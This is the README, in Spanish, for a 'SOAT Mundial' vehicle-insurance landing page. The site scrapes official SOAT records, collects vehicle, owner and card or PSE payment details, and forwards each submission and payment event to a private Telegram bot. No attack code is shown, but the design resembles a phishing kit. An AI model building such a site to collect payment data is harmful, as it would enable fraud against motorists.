# SOAT Mundial Landing Page

Landing page moderna para SOAT Mundial con funcionalidades interactivas y notificaciones en tiempo real.

## 🚀 Características

- **Consulta de SOAT**: Integración con el sistema oficial para verificar estado de SOAT
- **Formulario interactivo**: Captura de datos del vehículo y propietario
- **Cálculo de precios**: Cotización automática de SOAT y seguros adicionales
- **Notificaciones Telegram**: Envío automático de solicitudes a bot de Telegram
- **Diseño responsive**: Optimizado para móviles y escritorio
- **Validación de datos**: Verificación en tiempo real de formularios

## 📋 Requisitos

- Node.js >= 14.0.0
- npm o yarn
- Cuenta de Telegram (para notificaciones)

## 🛠️ Instalación

1. Clona el repositorio:

```bash
git clone <url-del-repositorio>
cd SOATMundial-2
```

2. Instala las dependencias:

```bash
npm install
```

3. Configura las variables de entorno:

```bash
cp config.example.env .env
# Edita el archivo .env con tus credenciales
```

4. Inicia el servidor:

```bash
npm start
```

5. Abre tu navegador en `http://localhost:3000`

## 🤖 Configuración de Telegram

Para recibir notificaciones de las solicitudes en Telegram:

1. Sigue las instrucciones en [README_TELEGRAM.md](README_TELEGRAM.md)
2. Configura tu bot de Telegram
3. Prueba la configuración:

```bash
npm run test-telegram
```

## 📁 Estructura del Proyecto

```
SOATMundial 2/
├── index.html          # Página principal
├── datos.html          # Página de confirmación de datos
├── pago.html           # Página de pago
├── server.js           # Servidor Express
├── soatScraper.js      # Scraper para consultar SOAT
├── datos.js            # Lógica de la página de datos
├── pago.js             # Lógica de la página de pago
├── style.css           # Estilos principales
├── datos.css           # Estilos de la página de datos
├── pago.css            # Estilos de la página de pago
├── imagenes/           # Recursos de imágenes
├── config.example.env  # Ejemplo de configuración
├── test-telegram.js    # Script de prueba de Telegram
└── README_TELEGRAM.md  # Documentación de Telegram
```

## 🔧 Scripts Disponibles

- `npm start` - Inicia el servidor de desarrollo
- `npm run dev` - Inicia el servidor de desarrollo
- `npm run test-telegram` - Prueba la configuración de Telegram

## 📡 API Endpoints

- `POST /api/soat` - Consultar datos de SOAT
- `POST /api/telegram` - Enviar datos a Telegram
- `POST /api/telegram-pago` - Enviar notificación de pago exitoso a Telegram
- `POST /api/telegram-paso-pagos` - Enviar notificación de paso a pagos a Telegram
- `POST /api/payment/card` - Procesar pago con tarjeta
- `POST /api/payment/pse` - Procesar pago PSE
- `POST /api/payment/payzen` - Procesar pago con PayZen
- `GET /api/health` - Estado del servidor

## 🔒 Variables de Entorno

Crea un archivo `.env` con las siguientes variables:

```env
TELEGRAM_BOT_TOKEN=tu_bot_token_aqui
TELEGRAM_CHAT_ID=tu_chat_id_aqui
PORT=3000

# PayZen
PAYZEN_SHOP_ID=tu_shop_id
PAYZEN_CERTIFICATE=tu_certificado
PAYZEN_ENVIRONMENT=sandbox # o production
```

## 📱 Funcionalidades

### Consulta de SOAT

- Verificación automática del estado del SOAT
- Extracción de datos del vehículo y propietario
- Validación de documentos

### Formulario de Datos

- Captura de información de contacto
- Selección de seguros adicionales
- Cálculo automático de precios
- Validación en tiempo real

### Notificaciones Telegram

- Envío automático de solicitudes completas
- Notificación de paso a pagos cuando el usuario ingresa contacto
- Notificación de pago exitoso con datos del usuario
- Formato estructurado con emojis
- Incluye todos los datos relevantes
- Timestamp de la solicitud y pago

## 🎨 Diseño

- Diseño moderno y responsive
- Paleta de colores corporativa
- Animaciones suaves
- Iconografía FontAwesome
- Tipografía Ubuntu

## 🔧 Tecnologías

- **Frontend**: HTML5, CSS3, JavaScript ES6+
- **Backend**: Node.js, Express.js
- **Scraping**: Playwright
- **Notificaciones**: Telegram Bot API
- **HTTP Client**: Axios

## 📞 Soporte

Para soporte técnico o preguntas:

1. Revisa la documentación de Telegram
2. Verifica los logs del servidor
3. Ejecuta el script de prueba

## 📄 Licencia

MIT License - ver archivo LICENSE para más detalles.
